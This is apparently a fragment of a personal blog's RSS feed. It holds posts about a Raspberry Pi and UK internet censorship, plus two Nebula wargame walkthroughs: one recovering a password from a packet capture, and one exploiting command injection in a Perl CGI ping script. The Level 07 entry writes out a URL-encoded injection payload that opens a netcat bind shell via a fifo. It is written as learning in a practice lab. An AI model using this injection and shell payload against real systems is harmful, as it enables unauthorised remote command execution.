+					<description><![CDATA[I ordered a Raspberry PI yesterday. I used to have a server running at home which served files, recorded tv, provided VPN, but I moved into a small flat, and there&#8217;s not much room for a server, not that my &#8230; <a href="/i-have-a-raspberry-pi-on-the-way/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>I ordered a Raspberry PI yesterday.</p>
+<p>I used to have a server running at home which served files, recorded tv, provided VPN, but I moved into a small flat, and there&#8217;s not much room for a server, not that my fiancée would be happy with anyway!</p>
+<p>The PI will give me a little server back again for the duration that I&#8217;m in this flat. I&#8217;m also looking at playing with xbmc and perhaps some pvr capabilities on it. Should be fun!</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/i-have-a-raspberry-pi-on-the-way/feed/</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Exploit Exercises – Nebula – Level 08</title>
+		<link>/exploit-exercises-nebula-level-08/</link>
+					<comments>/exploit-exercises-nebula-level-08/#respond</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Sat, 01 Dec 2012 12:17:44 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">/?p=222</guid>
+
+					<description><![CDATA[I must admit I needed a bit of help with his one, I had most of it but not quite all. It started with the following information: World readable files strike again. Check what that user was up to, and &#8230; <a href="/exploit-exercises-nebula-level-08/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>I must admit I needed a bit of help with his one, I had most of it but not quite all. It started with the following information:</p>
+<p style="text-align: left; padding-left: 30px;">World readable files strike again. Check what that user was up to, and use it to log into flag08 account.<br />
+To do this level, log in as the level08 account with the password level08 . Files for this level can be found in /home/flag08.</p>
+<p style="text-align: left;">So in ~flag08 there is one file of interest; capture.pcap. This is some captured network traffic. I copied this file onto my Macbook and opened it up in wireshark and spent some time looking through it. I found some interesting information like frame 43 contained a password prompt (the text &#8220;Password:&#8221;) from the server, followed by an ack from the client, then all subsequent packet exchanges contained 1 byte of TCP payload data from the client followed by an empty TCP ack packet from the server. Going through the packets, I could see that the user had sent: &#8220;backdoor&#8230;00Rm8.ate.&#8221; and then the server had replied &#8220;Login incorrect&#8221;. If we right click on a packet in the stream and select Follow TCP stream, we can see this a bit clearer.</p>
+<p style="text-align: left;">But &#8220;backdoor&#8230;00Rm8.ate.&#8221; is not the password for flag08&#8217;s account, we need more investigation. While in the Follow TCP stream view, I selected hex dump view, and I can see that all the dots are not the same byte. Presumably they are all ascii, so I checked the ascii codes; 7f=backspace, 0d=Carriage-return.</p>
+<p style="text-align: left;">So the password was &#8220;backd00Rmate&#8221;, this just so happens to be the password for flag08&#8217;s account.</p>
+<p style="text-align: left;">
+]]></content:encoded>
+					
+					<wfw:commentRss>/exploit-exercises-nebula-level-08/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Exploit Exercises – Nebula – Level 07</title>
+		<link>/exploit-exercises-nebula-level-07/</link>
+					<comments>/exploit-exercises-nebula-level-07/#respond</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Sat, 01 Dec 2012 11:58:49 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">/?p=218</guid>
+
+					<description><![CDATA[This one starts with the following information: The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server. and Source code: #!/usr/bin/perl use CGI qw{param}; print &#34;Content-type: &#8230; <a href="/exploit-exercises-nebula-level-07/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>This one starts with the following information:</p>
+<p style="padding-left: 30px;">The <em>flag07</em> user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>
+<p>and Source code:</p>
+<pre lang="Perl" line="1" escaped="true">
+#!/usr/bin/perl
+
+use CGI qw{param};
+
+print &quot;Content-type: text/html\n\n&quot;;
+
+sub ping {
+    $host = $_[0];
+
+    print(&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;);
+
+    @output = `ping -c 3 $host 2&gt;&amp;1`;
+    foreach $line (@output) { print &quot;$line&quot;; } 
+
+    print(&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;);
+
+}
+
+# check if Host set. if not, display normal page, etc
+
+ping(param(&quot;Host&quot;));
+</pre>
+<p>We can see that the flag07 user has an thttpd.conf file in his directory, indicating that he has a http daemon or (web server) running. This is further compounded by the fact that he has a perl script (index.cgi) in his home directory.</p>
+<p>In the thttpd.conf file it tells us that the web server is running on port 7007. I didn&#8217;t want to exit the VM, which meant that I didn&#8217;t have a web browser, but I do have wget which allows me to make http requests from the command line so I ran:</p>
+<pre lang="Bash">wget -O- http://localhost:7007/index.cgi</pre>
+<p>and got some output telling me how to use ping (because it hadn&#8217;t been given sufficient arguments. From the perl code, I could see that it wants a variable submitted as &#8220;Host&#8221;. It looks like it will use this as the machine name to ping. This time I tried:</p>
+<pre lang="Bash">wget -O- http://localhost:7007/index.cgi?Host=localhost</pre>
+<p>and got back ping results, but I need to get this script to do something other than ping&#8230; I can see that the ping command is just a string with the submitted host name &#8220;injected&#8221; into it. There is no input sanitisation going on, so it is ripe for some code injection.</p>
+<p>I could get the script to copy my elevated-shell-launcher program and thenset the setuid bit like I did in level 03, but this challenge reminded me of something I learned while playing with DVWA (using netcat to send shell over the network) so I tried that method instead. The url I need to load would submit the following as the Host variable:</p>
+<pre lang="Bash">;mkfifo /tmp/pipe;cat /tmp/pipe|bash|nc -l 4444 2&gt;&amp;1&gt;/tmp/pipe;rm /tmp/fifo;</pre>
+<p>When injected to the command that is run in the perl script, to actual command that is executed will be:</p>
+<pre lang="Bash">ping -c 3 ;mkfifo /tmp/pipe;cat /tmp/pipe|bash|nc -l 4444 2&gt;&amp;1&gt;/tmp/pipe;rm /tmp/fifo; 2&gt;&amp;1</pre>
+<p>This is quite a command, so I&#8217;ll break it down:</p>
+<ul>
+<li><strong>ping -c 3 ;</strong> &#8211; This command will fail because there is no host given, but we don&#8217;t care about that</li>
+<li><strong>mkfifo /tmp/pipe;</strong> &#8211; Make a special &#8220;pipe&#8221; file in /tmp/pipe, I&#8217;ll explain why later&#8230;</li>
+<li><strong>cat /tmp/pipe|bash|nc -l 4444 2&gt;&amp;1&gt;/tmp/pipe;</strong> &#8211; this reads data from the /tmp/pipe and sends it to /bin/bash, which sends it&#8217;s output to nc, which is listening on port 4444, which then sends it&#8217;s output (stdout and stderr) back to /tmp/pipe.</li>
+<li><strong>rm /tmp/fifo;</strong> &#8211; clear up the pipe file after nc has closed.</li>
+<li><strong>2&gt;&amp;1</strong> &#8211; Redirects stderr to stdout. This is just left over from the perl script&#8217;s command, we don&#8217;t care about it really.</li>
+</ul>
+<p>This should set up a netcat process listening on TCP port 4444 that will accept data (in our case this will be bash commands) from the network and send it to /tmp/pipe. cat will read data from /tmp/pipe and send it to bash, which will send it&#8217;s output to netcat, which will in turn send that back over the network. A kind of remote shell. Passing input/output of netcat and bash in this circular fashion is only possible by way of a fifo pipe and the cat command.</p>
+<p>Obviously I&#8217;ll have to URL encode my host variable, so my whole command becomes:</p>
+<pre lang="Bash">wget -O- http://localhost:7007/index.cgi?Host=%3Bmkfifo%20%2Ftmp%2Fpipe%3Bcat%20%2Ftmp%2Fpipe%7Cbash%7Cnc%20-l%204444%202%3E%261%3E%2Ftmp%2Fpipe%3Brm%20%2Ftmp%2Ffifo%3B</pre>
+<p>Now I just connect from another tty session or another machine on the network (though you&#8217;ll have to edit the command if you do that) using:</p>
+<pre lang="Bash">nc localhost 4444</pre>
+<p>Now I can run any command including whoami and getflag</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/exploit-exercises-nebula-level-07/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Internet censorship</title>
+		<link>/internet-censorship/</link>
+					<comments>/internet-censorship/#respond</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Mon, 08 Oct 2012 08:23:06 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">/?p=128</guid>
+
+					<description><![CDATA[My Finacee and I used to live on a farm just north of Bristol where the broadband options were pretty slim. While my friend in a town closer to London was getting 70Mb/s downstream, we were only offered 0.5Mb/s. I &#8230; <a href="/internet-censorship/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>My Finacee and I used to live on a farm just north of Bristol where the broadband options were pretty slim. While my friend in a town closer to London was getting 70Mb/s downstream, we were only offered 0.5Mb/s. I ended up getting a 3G dongle with a wireless 3G router and using HSPA+ on the three.co.uk network and we regularly managed speeds of around 7Mb/s (around 14x faster than we would have got if we used the phone line).</p>
+<p>We moved, this weekend, to a town closer to London, and I have left the dongle with the new tennants at the farm. I am currently researching what ISP I should go with. While looking at an ISP that I had been recommended (because of their technical expertise and support) I noticed a link to an article about the web censorship we are currently facing in the UK, and the reason that they do not censor on their network.</p>
+<p>It was not news to me, but I found it an interesting read anyway.</p>
+<p><a href="http://www.aa.net.uk/news-censorship.html" title="Article on Internet Censorship" target="_blank">The article can be found here</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/internet-censorship/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
